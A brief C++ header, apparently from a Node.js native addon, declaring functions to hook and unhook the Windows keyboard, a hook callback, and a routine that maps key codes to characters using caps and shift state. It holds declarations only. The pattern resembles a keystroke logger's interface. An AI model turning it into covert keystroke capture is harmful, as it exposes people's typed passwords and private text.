#pragma once

#include "os.h"
#include <napi.h>

#include <string>
#include <fstream>
#include <sstream>
#include <iostream>

namespace HookKeyboard
{
  BOOL hookKeyBoard();
  void unhookKeyboard();
  std::string DayOfWeek(int code);
  LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam);
  std::string HookCode(DWORD code, BOOL caps, BOOL shift);

}
